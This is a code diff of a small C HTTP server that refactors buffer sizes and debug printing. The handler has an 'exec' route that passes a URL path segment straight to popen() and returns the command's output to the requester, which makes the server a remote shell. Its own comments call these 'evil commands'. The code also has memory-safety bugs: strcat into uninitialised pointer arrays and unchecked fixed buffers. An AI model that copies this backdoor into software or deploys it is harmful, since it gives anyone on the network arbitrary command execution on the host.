@@ -10,6 +10,8 @@
 #include<sys/socket.h>
 #include<arpa/inet.h>
 
+#define MAX_CHARS 99999
+
 
 #define CLIENTS_MAX 1000
 #define BYTES 1024
@@ -24,42 +26,9 @@ char *web_server_root_path;
 int listening_socket;
 int clients[CLIENTS_MAX];
 
-// breaking down the server into procedures, so it is easier to handle.
 
 void web_server_start(char *);
 void web_server_respond(int);
-/* Converts a hex character to its integer value */
-char from_hex(char ch) {
-        return isdigit(ch) ? ch - '0' : tolower(ch) - 'a' + 10;
-}
-
-/* Converts an integer value to its hex character*/
-char to_hex(char code) {
-        static char hex[] = "0123456789abcdef";
-        return hex[code & 15];
-}
-/* Returns a url-decoded version of str */
-/* IMPORTANT: be sure to free() the returned string after use */
-char *url_decode(char *str) {
-        char *pstr = str, *buf = malloc(strlen(str) + 1), *pbuf = buf;
-        while (*pstr) {
-                if (*pstr == '%') {
-                        if (pstr[1] && pstr[2]) {
-                                *pbuf++ = from_hex(pstr[1]) << 4 | from_hex(pstr[2]);
-                                pstr += 2;
-                        }
-                } else if (*pstr == '+') {
-                        *pbuf++ = ' ';
-                } else {
-                        *pbuf++ = *pstr;
-                }
-                pstr++;
-        }
-        *pbuf = '\0';
-        return buf;
-}
-
-
 
 
 int main(int argc , char* argv[ ] )
@@ -97,7 +66,7 @@ int main(int argc , char* argv[ ] )
     	int slot=0;
 	
 	
-  	printf("Listening on port %s \nRoot directory is %s\n",listening_port, web_server_root_path); 
+  	printf("Listening on port %s \nRoot directory is %s\n\n\n",listening_port, web_server_root_path); 
     	
 	// setting up the values of the clients to -1 which means
 	// that the client is not connected.
@@ -196,27 +165,27 @@ void web_server_start(char *port) {
 
 void web_server_respond(int n) {
 
-	char *client_request[99999];
+	char *client_request[MAX_CHARS];
 	
 	// this is going to be for our evil commands.
     	char *evil_cmd[2];
 
-    	char message[99999];
+    	char message[MAX_CHARS];
 
 
 	char data_to_send[BYTES];
-	char path[99999];
+	char path[MAX_CHARS];
 	
     	int received;
 	int  fd;
 	int  bytes_read;
 
 
-  	memset( (void*) message, (int)'\0' , 99999 );
+  	memset( (void*) message, (int)'\0' , MAX_CHARS );
 
         //ssize_t recv(int sockfd, void *buf, size_t len, int flags);
         // with flags = 0 recv will be similar to read().	
-	received = recv( clients[n] , message , 99999 , 0 );
+	received = recv( clients[n] , message , MAX_CHARS , 0 );
 
 	// If no messages are available to be received and the peer has performed an orderly
         // shutdown, recv() is going to return 0.
@@ -231,8 +200,7 @@ void web_server_respond(int n) {
 
 	// we have receeived something. 
 	else {
-		// just printing the client's request. Debugging.
-        	printf("Request: %s\n", message);
+        	printf("\nRequest: %s", message);
 
 		// seperating the client request.
 		// [0] will get the request type: GET, POST, HEAD.
@@ -249,13 +217,10 @@ void web_server_respond(int n) {
             		//client_request[2] = strtok (NULL, " \t\n");
 			int ii;
 			int i;
-			char *hishcmd[99999];
-			char *http_version[99999];
-			strcpy(http_version, "HTTP,2323");
-			printf("%s\n", http_version);
-			//printf("%s\n", client_request[1]);
-			//strncmp(client_request[ii],"HTTP/1.1", 8) != 0
-			for (ii = 1; ii < 99999;ii++)
+			char *hishcmd[MAX_CHARS];
+			char *http_version[MAX_CHARS];
+			
+			for (ii = 1; ii < MAX_CHARS;ii++)
 			{
 				client_request[ii] = strtok (NULL, " ");
 				if (strncmp(client_request[ii],"HTTP/1.1", 8) == 0) {
@@ -265,39 +230,29 @@ void web_server_respond(int n) {
 					strcpy(http_version, "HTTP/1.0");
 					break;
 				}
-				//printf("*ddddd");
-				//client_request[ii] = strtok (NULL, " \t");
+
 				hishcmd[ii-1] = client_request[ii];
 				
-				//printf("*%s", hishcmd[ii-1]);
 			}
-			printf("ii: %d\n", ii);
+
+			printf("Request HTTP Version : %s \n", http_version);
 			
-			//debugging only.
-			//for (ii =0; ii < 10; ii++)
-			//	printf("[%d] %s\n", ii, hishcmd[ii]);
-			char *final_cmd[99999];// = strcat(hishcmd[]);
+			char *final_cmd[MAX_CHARS];// = strcat(hishcmd[]);
 				
 			for (i=0; i < ii-1; i++)
 			{
 				
 				printf("[%d] %s\n", i, hishcmd[i]);
-				//final_cmd[ii] = '^';
-				//strcpy(final_cmd[ii], "goingtohell");
 			}
-			/*		
-		   	for (ii = 0; ii < 20; ii++)
-				printf("[%d]%s\n", ii, hishcmd[ii]);
-			*/
+			
 			for (i =0; i < ii-1;i++) {
 				strcat(final_cmd, hishcmd[i]);
 				strcat(final_cmd, " ");
-				//strcpy(final_cmd, hishcmd[ii]);	
 			}
 			printf("%s\n ", final_cmd);
 			
 
-			char *final_final_cmd[99999];
+			char *final_final_cmd[MAX_CHARS];
 			final_final_cmd[0] = strtok(final_cmd, "/");
 			final_final_cmd[1] = strtok(NULL, "/");
 			printf("%s\n", final_final_cmd[1]);
@@ -313,22 +268,17 @@ void web_server_respond(int n) {
 				}
 
                 		strcpy(path, web_server_root_path);
-                		//strcpy(&path[strlen(web_server_root_path)], client_request[1]);
-                	
-				//printf("file: %s\n", path);
-
-				// evilness starts here.
-				//if (strncmp(client_request[1], "/exec/", 6) == 0) {
-				if (strncmp(url_decode(final_final_cmd[0]), "exec", 4) == 0) {
+				
+				if (strncmp(final_final_cmd[0], "exec", 4) == 0) {
 					printf("execute command: ");
 
 					evil_cmd[0] = strtok(client_request[1], "/");
 					evil_cmd[1] = strtok(NULL, "/"); 
 			
-					printf("%s\n", url_decode(final_final_cmd[1]));
+					printf("%s\n", final_final_cmd[1]);
 					send(clients[n], HTTP_RESPONSE_200, strlen(HTTP_RESPONSE_200), 0);
 					FILE *fp;
-					fp = popen(url_decode(final_final_cmd[1]),"r");
+					fp = popen(final_final_cmd[1],"r");
 					char content[10000];
 					while (fgets(content, 10000, fp) != NULL)
 						write(clients[n], content, 10000);
